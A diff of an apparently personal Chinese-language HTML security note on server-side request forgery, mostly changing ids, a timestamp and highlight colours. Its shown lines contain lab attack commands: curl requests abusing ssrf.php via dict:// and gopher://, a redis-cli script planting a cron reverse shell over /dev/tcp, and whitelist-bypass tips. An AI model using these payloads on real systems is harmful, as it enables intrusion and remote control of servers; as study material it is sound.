@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-09-07 Wed 23:13 -->
+<!-- 2022-09-08 Thu 00:11 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SSRF</title>
@@ -36,9 +36,9 @@
 <header>
 <h1 class="title">SSRF</h1>
 </header>
-<div id="outline-container-orgda19889" class="outline-2">
-<h2 id="orgda19889">服务器端请求伪造</h2>
-<div class="outline-text-2" id="text-orgda19889">
+<div id="outline-container-org60c5b02" class="outline-2">
+<h2 id="org60c5b02">服务器端请求伪造</h2>
+<div class="outline-text-2" id="text-org60c5b02">
 <p>
 Server-Side Request Forgery：服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回数据<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>。
 </p>
@@ -51,16 +51,16 @@ Server-Side Request Forgery：服务器端请求伪造，是一种由攻击者�
 来源于知乎<sup><a id="fnr.1.100" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>，顺便尝试下 graphviz 画图：
 </p>
 
-<figure id="org8e68cf1">
+<figure id="org1ecda9c">
 <img src="../images/ssrf_img1.png" alt="ssrf_img1.png">
 
 </figure>
 </div>
 </div>
 
-<div id="outline-container-org3cd41f4" class="outline-2">
-<h2 id="org3cd41f4">存在 SSRF 隐患的 PHP 函数</h2>
-<div class="outline-text-2" id="text-org3cd41f4">
+<div id="outline-container-orge1fc9d4" class="outline-2">
+<h2 id="orge1fc9d4">存在 SSRF 隐患的 PHP 函数</h2>
+<div class="outline-text-2" id="text-orge1fc9d4">
 <ul class="org-ul">
 <li><p>
 <code>file_get_contents()</code>
@@ -127,9 +127,9 @@ if (isset($_POST['url'])){
 </ul>
 </div>
 
-<div id="outline-container-orge8d7df5" class="outline-3">
-<h3 id="orge8d7df5">攻击 <a href="20220730-redis.html#ID-0f357c15-ef76-4958-857d-fc30339c5f9c">Redis</a> <sup><a id="fnr.2.100" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></h3>
-<div class="outline-text-3" id="text-orge8d7df5">
+<div id="outline-container-org9cb5dcc" class="outline-3">
+<h3 id="org9cb5dcc">攻击 <a href="20220730-redis.html#ID-0f357c15-ef76-4958-857d-fc30339c5f9c">Redis</a> <sup><a id="fnr.2.100" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></h3>
+<div class="outline-text-3" id="text-org9cb5dcc">
 <div class="org-src-container">
 <pre class="src src-php">&lt;?php
 # ssrf.php
@@ -161,7 +161,7 @@ curl_close($ch); //关闭 cURL 资源，并且释放系统资源
 <a href="20220708-network_protocol.html#ID-6d4b32fe-0963-4fd0-9e79-a09905dced7b">dict</a> 探测端口：
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">curl -v -H <span style="color: #008000;">'host:one.php.local'</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'</span>
+<pre class="src src-bash"><span style="color: #6434A3;">curl</span> -v -H <span style="color: #008000;">'host:one.php.local'</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'</span>
 </pre>
 </div>
 <p>
@@ -173,7 +173,7 @@ Invalid SSH identification string.
 exp(linux):
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006FE0;">echo</span> -e <span style="color: #008000;">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"</span>|redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> -x set <span style="color: #D0372D;">1</span>
+<pre class="src src-bash"><span style="color: #6434A3;">echo</span> -e <span style="color: #008000;">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"</span>|redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> -x set <span style="color: #D0372D;">1</span>
 redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> config set dir /var/spool/cron/
 redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> config set dbfilename root
 redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> save
@@ -194,29 +194,29 @@ bash shell.sh 127.0.0.1 <span style="color: #D0372D;">6379</span>
 再利用 <a href="20220708-network_protocol.html#ID-a58133b5-ab13-4e15-992a-dcdd8b5c0fd2">gopher</a> 协议 payload<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup> 反弹 shell:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">curl -v <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...'</span> -H <span style="color: #008000;">'host: one.php.local'</span>
+<pre class="src src-bash"><span style="color: #6434A3;">curl</span> -v <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...'</span> -H <span style="color: #008000;">'host: one.php.local'</span>
 </pre>
 </div>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org0e84b13" class="outline-2">
-<h2 id="org0e84b13">SSRF 漏洞</h2>
-<div class="outline-text-2" id="text-org0e84b13">
+<div id="outline-container-org2c23b63" class="outline-2">
+<h2 id="org2c23b63">SSRF 漏洞</h2>
+<div class="outline-text-2" id="text-org2c23b63">
 </div>
-<div id="outline-container-orgbe0efa8" class="outline-3">
-<h3 id="orgbe0efa8">Weblogic CVE-2014-4210 <sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup></h3>
-<div class="outline-text-3" id="text-orgbe0efa8">
-</div>
-</div>
-<div id="outline-container-org34fd664" class="outline-3">
-<h3 id="org34fd664">Discuz 3.4X SSRF</h3>
+<div id="outline-container-org0fb8247" class="outline-3">
+<h3 id="org0fb8247">Weblogic CVE-2014-4210 <sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup></h3>
+<div class="outline-text-3" id="text-org0fb8247">
 </div>
 </div>
-<div id="outline-container-orgd7b3abe" class="outline-2">
-<h2 id="orgd7b3abe">绕过 URL 白名单或禁内网 IP 地址</h2>
-<div class="outline-text-2" id="text-orgd7b3abe">
+<div id="outline-container-orgc2b3c9d" class="outline-3">
+<h3 id="orgc2b3c9d">Discuz 3.4X SSRF</h3>
+</div>
+</div>
+<div id="outline-container-orgddb09be" class="outline-2">
+<h2 id="orgddb09be">绕过 URL 白名单或禁内网 IP 地址</h2>
+<div class="outline-text-2" id="text-orgddb09be">
 <ul class="org-ul">
 <li>@</li>
 <li>IP 地址转换为其他进制</li>
